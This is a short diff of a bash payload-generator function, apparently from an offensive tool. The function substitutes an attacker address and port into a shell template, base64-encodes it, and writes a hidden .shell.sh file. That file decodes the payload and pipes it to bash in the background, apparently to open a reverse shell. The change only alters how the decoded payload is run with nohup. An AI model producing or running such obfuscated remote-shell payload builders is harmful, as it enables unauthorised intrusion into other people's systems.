@@ -33,7 +33,7 @@ function genpayload(){
 				shell="${shell/'address'/$address}"
 				shell="${shell/'prt'/$port}"
 				encode=$(echo $shell | base64)
-				echo "nohup echo \"${encode}\" | base64 -d | bash &" > .shell.sh
+				echo "echo \"${encode}\" | base64 -d | nohup bash 2>&1" > .shell.sh
 				chmod +x .shell.sh
 				echo -e "Payload saved as `pwd`/.shell.sh"
 				read -p "Press enter to continue "
